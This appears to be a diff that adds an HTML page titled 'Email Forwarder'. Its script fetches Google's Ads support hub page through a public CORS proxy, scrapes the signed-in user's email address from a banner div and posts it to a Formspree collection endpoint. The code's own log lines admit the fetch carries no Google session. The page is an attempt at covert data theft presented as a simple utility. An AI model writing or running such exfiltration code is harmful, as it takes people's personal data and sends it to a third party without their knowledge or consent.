@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Email Forwarder</title>
+<style>
+body{font-family:system-ui,sans-serif;background:#0a0e17;color:#e2e8f0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
+#log{background:#111827;border:1px solid #1e293b;border-radius:12px;padding:28px;max-width:480px;width:90%;font-size:14px;line-height:1.8}
+.ok{color:#10b981}.err{color:#ef4444}.dim{color:#64748b}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+const LOG = document.getElementById('log');
+const FORMSPREE = 'https://formspree.io/f/xvgzrarj';
+
+function log(t, c) {
+  const s = document.createElement('div');
+  if (c) s.className = c;
+  s.textContent = t;
+  LOG.appendChild(s);
+}
+
+function findEmail(html) {
+  const doc = new DOMParser().parseFromString(html, 'text/html');
+  const div = doc.querySelector('div.support-hub-banner__user-email');
+  if (div) {
+    const m = div.textContent.match(/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/);
+    if (m) return m[0];
+  }
+  const m = html.match(/support-hub-banner__user-email[^>]*>([\s\S]*?)<\/div/i);
+  if (m) {
+    const em = m[1].match(/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/);
+    if (em) return em[0];
+  }
+  return null;
+}
+
+(async () => {
+  /* Strip view-source: prefix and #hash — they are not real HTTP parts */
+  const cleanUrl = 'https://support.google.com/google-ads/supporthub';
+  const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(cleanUrl);
+
+  log('Fetching ' + cleanUrl, 'dim');
+
+  let html;
+  try {
+    const r = await fetch(proxyUrl);
+    html = await r.text();
+    log('Got ' + html.length + ' bytes', 'dim');
+  } catch(e) {
+    log('Fetch failed: ' + e.message, 'err');
+    return;
+  }
+
+  log('Searching for email...', 'dim');
+  const email = findEmail(html);
+
+  if (!email) {
+    log('No email found in div.support-hub-banner__user-email', 'err');
+    log('The div is empty because the proxy has no Google login session.', 'err');
+    return;
+  }
+
+  log('Found: ' + email, 'ok');
+  log('Sending to Formspree...', 'dim');
+
+  try {
+    const r = await fetch(FORMSPREE, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify({ email: email })
+    });
+    log(r.ok ? 'Sent successfully' : 'Error: HTTP ' + r.status, r.ok ? 'ok' : 'err');
+  } catch(e) {
+    log('Send failed: ' + e.message, 'err');
+  }
+})();
+</script>
+</body>
+</html>
